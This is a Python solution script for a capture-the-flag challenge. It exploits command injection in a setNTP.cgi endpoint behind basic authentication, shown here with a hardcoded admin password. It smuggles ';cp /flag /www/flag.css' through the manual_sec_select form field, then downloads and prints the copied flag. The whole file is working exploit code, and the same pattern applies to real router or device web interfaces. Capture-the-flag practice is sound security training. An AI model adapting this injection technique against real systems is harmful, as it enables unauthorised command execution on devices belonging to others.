#!/usr/bin/env python3
'''
Solution script
'''
from urllib.parse import quote
from requests import get, post
from requests.auth import HTTPBasicAuth

VULNERABLE_ENDPOINT = 'http://localhost:8004/setNTP.cgi'
#VULNERABLE_ENDPOINT = 'https://trellixhax-reachable-fruit.chals.io/setNTP.cgi'
HTTP_USER = 'admin'
HTTP_PASSWORD = '8^hj%u^40D8b8%lx47n0'
COPY_COMMAND = 'cp /flag /www/flag.css'
FLAG_URL = 'http://localhost:8004/flag.css'
#FLAG_URL = 'https://trellixhax-reachable-fruit.chals.io/flag.css'

def copy_flag_to_www() -> None:
    '''
    Exploits command injection to make flag accessible.
    '''
    _ = post(
        VULNERABLE_ENDPOINT,
        data='timeTag=manual&manual_sec_select=' + quote(f';{COPY_COMMAND}'),
        auth=HTTPBasicAuth(HTTP_USER, HTTP_PASSWORD)
    )

def show_flag() -> None:
    '''
    Prints flag to standard out
    '''
    response = get(FLAG_URL, auth=HTTPBasicAuth(HTTP_USER, HTTP_PASSWORD))
    print(response.text)

if __name__ == '__main__':
    # NOTE: first connection can get refused for some reason.
    try:
        _ = get('http://localhost:8004')
        #_ = get('https://trellixhax-reachable-fruit.chals.io')
    except ConnectionError:
        pass

    copy_flag_to_www()
    show_flag()
